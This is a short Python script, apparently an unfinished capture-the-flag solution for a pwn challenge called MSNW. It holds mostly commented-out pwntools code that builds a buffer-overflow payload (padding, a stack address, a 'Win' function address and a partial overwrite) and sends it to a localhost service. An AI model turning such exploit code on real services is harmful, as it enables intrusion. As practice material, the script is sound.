# from pwn import *

# port = 1234
# rem = remote("localhost", port)

# elf = ELF("./Pwnable/MSNW/problem/deploy/msnw")

# win_addr = elf.symbols['Win']

# payload = b'A' * 48
# payload += p64(0x7ffd9f8e44f0)
# payload += p64(win_addr)
# payload += b'B' * (0x130 - len(payload))
# payload += b'\xf0\x43'
# # payload += p64(win_addr)
# rem.sendafter(b": ", payload)

# print(rem.recvall())

print('A' * 0x130)